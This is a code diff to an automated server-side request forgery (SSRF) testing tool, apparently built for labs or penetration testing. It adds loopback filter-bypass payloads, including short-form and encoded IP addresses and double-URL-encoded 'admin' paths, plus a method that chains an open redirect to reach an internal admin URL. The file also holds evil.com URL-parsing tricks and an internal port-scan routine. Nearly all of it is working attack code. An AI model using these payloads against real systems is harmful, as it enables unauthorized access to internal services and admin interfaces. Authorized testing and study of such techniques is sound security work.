@@ -196,12 +196,19 @@ class AutoSSRF:
     def test_bypass(self) -> dict:
         """Test SSRF filter bypass techniques."""
         bypass_payloads = [
+            # IP format bypass
+            ("short_form", "http://127.1"),
             ("decimal_ip", "http://2130706433"),
             ("hex_ip", "http://0x7f000001"),
             ("octal_ip", "http://0177.0.0.1"),
             ("nip_io", "http://127.0.0.1.nip.io"),
             ("sslip_io", "http://127.0.0.1.sslip.io"),
             ("ipv6", "http://[::1]"),
+            # URL encoding bypass
+            ("double_encode_a", "http://127.1/%2561dmin"),
+            ("double_encode_d", "http://127.1/%2564dmin"),
+            ("single_encode_a", "http://127.1/%61dmin"),
+            # URL tricks
             ("redirect", "http://httpbin.org/redirect-to?url=http://127.0.0.1"),
             ("url_fragment", "http://127.0.0.1#@evil.com"),
             ("url_at", "http://evil.com@127.0.0.1"),
@@ -221,6 +228,38 @@ class AutoSSRF:
                 })
 
         return {"tested": len(bypass_payloads), "bypasses_found": len(results), "results": results}
+
+    def test_open_redirect_chain(self, redirect_endpoint: str, internal_target: str = "http://192.168.0.12:8080/admin") -> dict:
+        """Test SSRF via open redirect chain.
+
+        Args:
+            redirect_endpoint: Open redirect URL (e.g., /product/nextProduct?path=)
+            internal_target: Internal URL to reach via redirect
+
+        This bypasses host-based SSRF filters because the initial request
+        goes to the app's own domain, then follows the redirect to internal.
+        """
+        # Build the chain: stockApi → open redirect → internal target
+        from urllib.parse import quote
+        chain_payload = f"{redirect_endpoint}{quote(internal_target, safe='')}"
+
+        result = self._test_payload(chain_payload)
+        if result.get("status") == 200 and len(result.get("body", "")) > 100:
+            self.vulnerable = True
+            self.findings.append({
+                "type": "ssrf_redirect_chain",
+                "redirect_endpoint": redirect_endpoint,
+                "internal_target": internal_target,
+                "chain_payload": chain_payload,
+            })
+            return {
+                "vulnerable": True,
+                "technique": "open_redirect_chain",
+                "payload": chain_payload,
+                "note": "Server follows redirect to internal target, bypassing host filter",
+            }
+
+        return {"vulnerable": False, "technique": "open_redirect_chain"}
 
     def test_internal_port_scan(self, ports: list = None) -> dict:
         """Scan common internal ports via SSRF."""
